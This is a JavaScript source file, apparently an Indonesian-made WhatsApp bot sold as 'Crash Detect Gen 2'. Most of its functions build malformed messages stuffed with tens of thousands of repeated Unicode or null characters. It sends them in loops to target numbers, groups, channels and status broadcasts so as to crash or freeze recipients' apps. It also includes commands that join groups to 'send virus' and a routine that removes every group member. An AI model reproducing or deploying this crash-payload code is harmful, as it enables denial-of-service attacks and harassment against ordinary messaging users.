/*
KALO MAU RENAME MINIM KASIH CREDIT YARNN LAH

GEN 2 ENC, BUY NO ENC KE NOMOR INI AJA. 
https://wa.me/6283176187861
...
module.exports = dinzz = async (dinzz, m, chatUpdate, store) => {
try {
...
const sender = m.key.fromMe
  ? (dinzz?.user?.id?.split(":")[0] || dinzz?.user?.id?.split(":")[0]) + "@s.whatsapp.net"
  : (m.key.participant || m.key.remoteJid);
const senderNumber = sender?.split('@')[0];
const senderName = "@" + senderNumber;
const botNumber = await dinzz.decodeJid(dinzz.user.id);
...
// Group function
const groupMetadata = isGroup ? await dinzz.groupMetadata(m.chat).catch((e) => ({})) : {};
...
//CONST VIRTEX
const { CrLxTrava } = require("../galau/bejatlu.js")
const { LagHomeTravas } = require("../galau/rinducella.js")
const { AndroTrava } = require("../galau/rindudinz.js")
const { IpHoneTrash } = require("../galau/rinduemak.js")
const { ExTndHome } = require("../galau/rindunenek.js")
const { TeLapeTra } = require("../galau/rindumygfcella.js")

//CONST FOTO
const foto = fs.readFileSync('./image/cellakapanbalik.jpg')
const yuda = fs.readFileSync('./image/guarinducell.jpg')
const dinzzbug = fs.readFileSync('./image/rindunenek.jpg')
...
// Console log
if (m.message) {
  console.log(chalk.hex("#8A2BE2")("CRASH DETECTOR GEN 2︎ "));
  console.log(chalk.hex("#00FF00")("Created By Yarnn & Dinzz"));
  ...
  console.log(chalk.hex("#8A2BE2")("CRASH DETECTOR VERSION 2 GEN 2"));
}

if (global.autoTyping) {
if (command) {
dinzz.sendPresenceUpdate('composing', from)
}
}
dinzz.autoshalat = dinzz.autoshalat ? dinzz.autoshalat : {}
	let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? dinzz.user.id : m.sender
	let id = m.chat 
    if(id in dinzz.autoshalat) {
    return false
    }
    let jadwalSholat = {
    shubuh: '04:18',
...
//KEAMANAN 
/*
const keamanan = 'https://github.com/dinzz1221/dinzz.js/raw/refs/heads/main/v9gen2';
...
const dbreply = (teks) => { 
dinzz.sendMessage(m.chat, { react: { text: "❗",key: m.key,}}); 
databaserep(teks)
    }        
...
const qtext = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast"} : {}) },'message': {extendedTextMessage: {text: "Yarnn" }}}
...
const totalFitur = () =>{
var mytext = fs.readFileSync("./start/Yarnn.js").toString()
...
await dinzz.relayMessage(isTarget, msg.message, { 
...
async function CrashJids(target) {
  ...
  await dinzz.relayMessage(target, msg.message, { 
    messageId: msg.key.id 
  });
}
//END BUG CH
...
//FUNCTION BUG
           async function VampCrashIos(dinzz, target) {
                   try {
                           const IphoneCrash = "𑇂𑆵𑆴𑆿".repeat(60000);
                           await dinzz.relayMessage(target, {
                                   locationMessage: {
                           ...
                           console.log("Send Bug By Crash Detect Gen 2");
                   } catch (error) {
                           console.error("Error Sending Bug:", error);
                   }
           }

async function VampiPhone(dinzz, target) {
            try {
                const messsage = {
                    botInvokeMessage: {
                        message: {
                            newsletterAdminInviteMessage: {
                                ...
                                newsletterName: "Halo iPhone... Crash Detect Is Back" + "ꦾ".repeat(120000),
                ...
                await dinzz.relayMessage(target, messsage, {
                    userJid: target,
                });
            }
            catch (err) {
...
async function viewOnceLiveLocation(target, participant) {
  ...
  await dinzz.relayMessage(target, payload.message, {
    participant
  });
}
...
async function protocolbug5(target, mention) {
    ...
    const embeddedMusic = {
        ...
        author: "𝐂𝐑𝐀𝐒𝐇 𝐃𝐄𝐓𝐄𝐂𝐓 𝐊𝐈𝐋 𝐘𝐎𝐔 😂!!" + "ោ៝".repeat(10000),
        title: "Finix",
    ...
    await dinzz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
...
async function protocolpayment(target, mention) {
  const dinzz = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        videoMessage: {
  ...
  await dinzz.relayMessage("status@broadcast", dinzz.message, {
    messageId: dinzz.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
  ...
  if (mention) {
    ...
    await dinzz.relayMessage(target, payment, kuntul);
  }
}
...
const msg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "120363321780343299@newsletter",
      newsletterName: "𝐂𝐑𝐀𝐒𝐇 𝐃𝐄𝐓𝐄𝐂𝐓 𝐊𝐈𝐋𝐋 𝐘𝐎𝐔 😂" + "ោ៝".repeat(10000),
      caption: "𝐃𝐈𝐍𝐙𝐙 𝐈𝐒 𝐇𝐄𝐑𝐄" + "ោ៝".repeat(10000),
      inviteExpiration: "999999999"
    }
  };

  await dinzz.relayMessage(target, msg, {
...
async function SendPairing(target, Ptcp = false) {
  ...
  try {
    await dinzz.relayMessage(target, messageContent, Ptcp ? {
      participant: {
        jid: target
      }
    } : {});
...
async function invisiblecall(target, mention = true) {
  let push = [];
  push.push({
    body: proto.Message.InteractiveMessage.Body.fromObject({ text: "𝐂𝐑𝐀𝐒𝐇 𝐃𝐄𝐓𝐄𝐂𝐓 𝐆𝐄𝐍 𝟐" }),
    footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "𝐂𝐑𝐀𝐒𝐇 𝐃𝐄𝐓𝐄𝐂𝐓𝐎𝐑 𝐆𝐄𝐍 𝟐" }),
...
const msg = {
    groupInviteMessage: {
      ...
      groupName: "?𝐃𝐈𝐍𝐙𝐙" + "ោ៝".repeat(10000),
      caption: "𝐃𝐈𝐍𝐙𝐙 𝐈𝐒 𝐁𝐀𝐂𝐊" + "ោ៝".repeat(10000),
      jpegThumbnail: null
    }
  };
  await dinzz.relayMessage(isTarget, msg, {
...
async function blanks(isTarget) {
    await dinzz.sendMessage(
        isTarget,
        {
            document: fs.readFileSync("./package.json"),
            fileName: "𝐃𝐈𝐍𝐙𝐙 😈",
            caption: "𝐃𝐈𝐍𝐙𝐙 𝐈𝐒 𝐁𝐀𝐂𝐊 😈",
            footer: "Crash Detector Gen 2",
            buttons: [
                {
                    buttonId: "X",
                    buttonText: {
                        displayText: "𝐂𝐫𝐚𝐬𝐡 𝐃𝐞𝐭𝐞𝐜𝐭𝐨𝐫 𝐆𝐞𝐧 𝟐 😈" + "\u0000".repeat(100000)
                    },
                    type: 1,
                },
            ],
...
async function bugdinzz4(target) {
  await dinzz.relayMessage(
    target,
    {
...
async function bugdinzz2(target) {
  await dinzz.relayMessage(
    target,
    {
      paymentInviteMessage: {
...
async function bugdinzz3(target) {
  dinzz.relayMessage(
    target,
    {
      extendedTextMessage: {
        ...
        contextInfo: {
          ...
          participant: target,
          quotedMessage: {
            conversation: "𝐃𝐈𝐍𝐙𝐙 𝐈𝐒 𝐁𝐀𝐂𝐊 😈" + "ꦾ࣯࣯".repeat(50000),
          },
disappearingMode: {
        ...
        await dinzz.relayMessage(
            ...
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "⚠️ Ɏ₳Ɽ₦₦ VIEWONCE BUG V4" },
                        content: undefined
                    }
                ]
            }
...
async function dinzzdelay2(target, mention = false, delayMs = 500) {
...
newsletterName: "𝐂𝐑𝐀𝐒𝐇 𝐃𝐄𝐓𝐄𝐂𝐓 𝐆𝐄𝐍 𝟐 😈" + "ꦾ".repeat(120000),
serverMessageId: 1
}
},
header: {
...
image: {  
url: "https://files.catbox.moe/4k8lrs.jpg",
gifPlayback: true
}
}, {
upload: dinzz.waUploadToServer,
mediaType: "image"
})),
hasMediaAttachment: true
},
body: { text: "" },
footer: { text: "𝐂𝐑𝐀𝐒𝐇 𝐃𝐄𝐓𝐄𝐂𝐓 𝐆𝐄𝐍 𝟐 😈" },
nativeFlowMessage: {
buttons: [
{
name: "single_select",
...
await dinzz.relayMessage(isTarget, msg.message, { messageId: msg.key.id });
}
...
async function VampireBugIns(target) {
        ...
        const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "𝐂𝐑𝐀𝐒𝐇 𝐃𝐄𝐓𝐄𝐂𝐓𝐎𝐑 😈 𝐊𝐈𝐋𝐋 𝐆𝐑𝐎𝐔𝐏" + "ꦾ".repeat(120000),
                        jpegThumbnail: "",
    ...
    buttons: [
        ...
        await dinzz.relayMessage(target, message, {
            userJid: target,
        });
    } catch (err) {
        ...
        const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "𝐂𝐑𝐀𝐒𝐇 𝐃𝐄𝐓𝐄𝐂𝐓𝐎𝐑 😈" + "ꦾ".repeat(120000),
                        jpegThumbnail: "",
...
async function dinzzblank(target) {
for (let i = 0; i <= 100; i++) {
await Blankhard(target);
await bugdinzz3(target);
await Crashblank(target);
await bugdinzz4(target);
await blanks(target);
await bugdinzz2(target);
}
console.log(chalk.blue(`Sending Crash Hard to ${target}☠️`));
} 

async function dinzznew1(target) {
for (let i = 0; i <= 100; i++) {
...
async function dinzznew2(target) {
for (let i = 0; i <= 100; i++) {
await protocolbug5(target);
await protocolbug5(target);
await protocolbug5(target);
...
async function dinzzblanknew(target) {
for (let i = 0; i <= 50; i++) {
await Blankhard(target);
await sleep(5000)    
await bugdinzz3(target);
...
dinzz.sendMessage(m.chat, {
text: teks,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: "ℂ𝕣𝕒𝕤𝕙 𝔻𝕖𝕥𝕖𝕔𝕥 𝕍𝟚 𝔾𝔼ℕ 𝟚",
body: '© Yarnn',
thumbnailUrl: 'https://files.catbox.moe/4k8lrs.jpg',
...
const payreply = (teks) => {
        return dinzz.sendMessage(m.chat, {text: teks,  contextInfo: {
            document: fs.readFileSync("./package.json"),
            filename: `dinzz`,
...
const buttonpayreply = (teks) => {
  ...
  const buttonMessage = {
    image: { url: `https://files.catbox.moe/4k8lrs.jpg` },
    caption: teks,
    footer: 'Crash Detect V2 Gen 2',
    buttons: buttons,
    headerType: 6,
    contextInfo: { 
  ...
  return dinzz.sendMessage(m.chat, buttonMessage, { quoted: lol });
}
  ...
  const buttonMessage = {
    ...
    contextInfo: { 
      ...
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363409362506610@newsletter",
        serverMessageId: null,
        newsletterName: `𝐂𝐑𝐀𝐒𝐇 𝐃𝐄𝐓𝐄𝐂𝐓𝐎𝐑 𝐕𝟐 𝐆𝐄𝐍 𝟐`
      },
      mentionedJid: ['13135550002@s.whatsapp.net'],
    },
    viewOnce: true
...
await dinzz.relayMessage(msgii.key.remoteJid, msgii.message, { 
...
subtitle: "",
hasMediaAttachment: true,
...(await prepareWAMessageMedia({ image: { url: `https://files.catbox.moe/4k8lrs.jpg` } }, { upload: dinzz.waUploadToServer })),
}),
gifPlayback: true,
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
...
await dinzz.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
}
...
switch (command) {
case 'menu': {
await dinzz.sendMessage(m.chat, { react: { text: "😈",key: m.key,}}); 
let teksnya = `张伟 hi, ${pushname} ${getGreeting()}, I'm Crash Detect Whatsapp bot designed and designed with JavaScript technology to help you, use me wisely 

张伟 *Crash Detect V2 GEN 2*
[ ♢ ] Bot Information ♔
◎ Bot Name : Crash Detect
◎ Creator : Yarnn
◎ Version : 2.0.0
...
Crash Detect  is ready to help you,Click the button and see what I can do 
`
    let buttons = [
    ...
    await dinzz.sendMessage(m.chat, buttonMessage, { quoted: lol });  
   await dinzz.sendMessage(m.chat, { audio: fs.readFileSync('./image/musik1.mp3'), mimetype: 'audio/mpeg', ptt: true }, { quoted: qtext });     
}
break;

case 'funmenu': {
await dinzz.sendMessage(m.chat, { react: { text: "😈",key: m.key,}}); 
let menu = `张伟 hi, ${pushname} ${getGreeting()}, I'm Crash Detect Whatsapp bot designed and designed with JavaScript technology to help you, use me wisely 
...
case 'allmenu': {
await dinzz.sendMessage(m.chat, { react: { text: "😈",key: m.key,}}); 
let teksnya = `张伟 hi, ${pushname} ${getGreeting()}, I'm Crash Detector Whatsapp bot designed and designed with JavaScript technology to help you, use me wisely 

张伟 *Crash Detector V2 GEN 2*
[ ♢ ] Bot Information ♔
◎ Bot Name : Crash Detector
◎ Creator : Yarnn
◎ Version : 2.0.0 Gen 2 !! 
◎ Runtime : ${runtime(process.uptime())}
◎ Type : Case
...
case "owner": {
await dinzz.sendMessage(m.chat, { react: { text: "😈",key: m.key,}}); 
let imgsc = await prepareWAMessageMedia({ image: fs.readFileSync("./image/rindunenek.jpg") }, { upload: dinzz.waUploadToServer })
...
buttons: [{                 
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Whatsapp dinzz\",\"url\":\"https://wa.me/6283176187861\",\"merchant_url\":\"https://www.google.com\"}`
},
{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Telegram\",\"url\":\"https://t.me/dinzzOffc\",\"merchant_url\":\"https://www.google.com\"}`
},
{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Saluran Crash Detector\",\"url\":\"https://whatsapp.com/channel/0029Vb8yDHFAYlUJ2er9370V\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
...
await dinzz.relayMessage(m.chat, msgii.message, {messageId: msgii.key.id})
}
...
case "tqto": {
await dinzz.sendMessage(m.chat, { react: { text: "😈",key: m.key,}}); 
let imgsc = await prepareWAMessageMedia({ image: fs.readFileSync("./image/guarinducell.jpg") }, { upload: dinzz.waUploadToServer })
const msgii = await generateWAMessageFromContent(m.chat, {
ephemeralMessage: {
message: {
messageContextInfo: {
...
Vinzz [ T.Kanan ]
Sass [ T.Kanan ]
Vann [ BestFriend Yarnn ] 
Rapli [ BestFriend Yarnn ]
All Partner Dinzz / Yarnn
All pengguna Script Ini

💢 CRASH DETECTOR GEN 2 💢
`, 
hasMediaAttachment: true,
...imgsc
}), 
...
buttons: [{                 
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Saluran Crash Detect\",\"url\":\"https://whatsapp.com/channel/0029Vb8yDHFAYlUJ2er9370V\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
...
case 'crash-saluran': {
if (!isOwner) return;
if (!text) return dinzz.sendMessage(m.chat, { text: "Masukkan ID newsletter!\nContoh: .ch id@newsletter" }, { quoted: m });
...
dinzz.sendMessage(m.chat, { text: `✅ Berhasil mengirim Bug ke ${newsletterId}.` }, { quoted: m });
break }
...
case 'delay-group': {
    ...
    if (groupLink.includes('https://chat.whatsapp.com/')) {
        ...
        try {
            let isTarget = await dinzz.groupAcceptInvite(groupId);
            payreply(`Sukses! ${command} Mengirimkan Virus Kedalam Grup By Crash Detect: ${groupLink} (Group ID: ${groupId})`);
...
await dinzz.sendMessage(m.chat, { react: { text: "🎉",key: m.key,}}); 
            ...
            dinzz.sendMessage(target, {text: `halo mass`});
for (let i = 0; i < 100; i++) {
...
buttonpayreply(`Seluruh Member Grup, Sudah Dapat Mengakses Bot Crash Detect!`)
break
case "delmurbuggc":{
...
let res = await dinzz.newsletterMetadata("invite", result)
await dinzz.newsletterReactMessage(res.id, serverId, args[1])
...
await dinzz.sendMessage(m.chat, { text: "❌ Gagal mengambil gambar. Pastikan API aktif atau coba lagi nanti!" }, { quoted: m })}
break; }
...
await dinzz.updateBlockStatus(mem, "unblock");
if (m.isGroup) dinzz.sendMessage(m.chat, {text: `Berhasil membuka blokiran @${mem.split('@')[0]}`, mentions: [mem]}, {quoted: m})
}
break
...
await dinzz.sendMessage(m.chat, {video: {url: res.result.video}, mimetype: "video/mp4", caption: "*Sukses*"}, {quoted: m})
await dinzz.sendMessage(m.chat, {react: {text: '', key: m.key}})
...
case "gitclone": {
if (!text) return m.reply(example("https://github.com/dinzz/Nika"))
...
try {
    ...
    dinzz.sendMessage(m.chat, { document: { url: url }, mimetype: 'application/zip', fileName: `${filename}`}, { quoted : m })
} catch (e) {
...
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.url}`}}, { upload: dinzz.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
...
await dinzz.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
} else {
let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")
await dinzz.sendMessage(m.chat, {video: {url: urlVid.url}, mimetype: 'video/mp4', caption: `*Sukses*`}, {quoted: m})
}
...
await dinzz.sendMessage(m.chat, { image: data, mimetype: "image/png"}, {quoted: m})
}
break
...
await dinzz.sendMessage(m.chat, {text: a.url}, {quoted: m})
}
break
...
if (!isOwner) return
let teks = `\n *List all group chat*\n`
let a = await dinzz.groupFetchAllParticipating()
...
let urutan = 0
for (let a of pin) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.images_url}`}}, { upload: dinzz.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgsc
...
await fetchJson("https://api.skyzopedia.us.kg/api/ai/openai-prompt?prompt=Sekarang Kamu Adalah Crash Detect-Ai dan selalu gunakan bahasa Indonesia saat menjawab semua pertanyaan&msg=" + talk).then(async (res) => {
                                                                                                       ...
                                                                                                       author: "Yarnn",
                                                                                                                   type: "image/png",
                                                                                                                                   ...
                                                                                                                                   const stikerBuffer = await sticker.toBuffer();
                                                                                                                                           await dinzz.sendMessage(m.chat, { sticker: stikerBuffer }, { quoted: m });
                                                                                                                                               } catch (err) {
...
var ppuser
try {
ppuser = await dinzz.profilePictureUrl(m.sender, 'image')
} catch (err) {
...
await dinzz.sendAsSticker(m.chat, tempnya, m, {packname: global.packname})
...
let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    ...
    if (/video/.test(type)) {
        return dinzz.sendMessage(m.chat, {video: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return dinzz.sendMessage(m.chat, {image: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
        return dinzz.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
}
break
...
let media = await dinzz.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('pixhost.to');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'dinzzy.png');

let teks = directLink.toString()
await dinzz.sendMessage(m.chat, {text: teks}, {quoted: m})
...
dinzz.sendFile(m.chat, enhanced, "", "_Sukses Membuat HD 3x Enhance✅_", m);
} catch (err) {
console.error(err);
await dinzz.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}
...
var onWa = await dinzz.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return payreply("Nomor tidak terdaftar di whatsapp")
const res = await dinzz.groupParticipantsUpdate(m.chat, [input], 'add')
...
var onWa = await dinzz.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return payreply("Nomor tidak terdaftar di whatsapp")
const res = await dinzz.groupParticipantsUpdate(m.chat, [input], 'remove')
...
if (!m.isGroup) return payreply(mess.group)
if (!m.isBotAdmin) return payreply(mess.botAdmin)
await dinzz.groupRevokeInvite(m.chat)
...
await dinzz.sendMessage(m.chat, {text: teks, mentions: [...member]}, {quoted: m})
}
break
...
if (!m.isGroup) return payreply(mess.group)
if (!m.isBotAdmin) return payreply(mess.botAdmin)
const urlGrup = "https://chat.whatsapp.com/" + await dinzz.groupInviteCode(m.chat)
var teks = `
${urlGrup}
`
await dinzz.sendMessage(m.chat, {text: teks, matchedText: `${urlGrup}`}, {quoted: m})
}
break
...
await dinzz.sendMessage(m.chat, {text: text, mentions: [...member]}, {quoted: m})
}
break
...
let id = await dinzz.groupAcceptInvite(result)
...
let res = await dinzz.newsletterMetadata("invite", result)
await dinzz.newsletterFollow(res.id)
m.reply(`
...
await dinzz.groupSettingUpdate(m.chat, 'not_announcement')
} else if (/closegc|close/.test(command)) {
if (m.metadata.announce == true) return 
await dinzz.groupSettingUpdate(m.chat, 'announcement')
} else {}
}
break
...
await payreply("Kudeta Grup By dinzz☠️")
for (let i of memberFilter) {
await dinzz.groupParticipantsUpdate(m.chat, [i], 'remove')
await sleep(1000)
}
...
await dinzz.groupParticipantsUpdate(m.chat, [target], action.toLowerCase()).then(async () => {
await dinzz.sendMessage(m.chat, {text: `Sukses ${action.toLowerCase()} @${target.split("@")[0]}`, mentions: [target]}, {quoted: m})
})
} else {
...
let teks = `\n *List Murbug Crash Detect*\n`
for (let i of premium) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
dinzz.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: lol})
}
break
...
await m.reply("Wait.....")
var name = `Crash Detect Version 2 By Dinzz`
...
await dinzz.sendMessage(m.sender, {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, mimetype: "application/zip"}, {quoted: m})
...
dinzz.sendMessage(m.chat, {text: teks, mentions: owner}, {quoted: lol})
}
break
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ //
...
let check = await dinzz.onWhatsApp(`${orang.split("@")[0]}`)
...
case 'createquote': {
 ...
 try {
 dinzz.sendMessage(m.chat, { image: { url }, caption: "Berhasil dibuat!" }, { quoted: m })
 } catch (e) {
...
if (m.text.toLowerCase() == "bot") {
   xreplybugbutton(`*Crash Detect V2 GEN 2 ON!!*`)
}
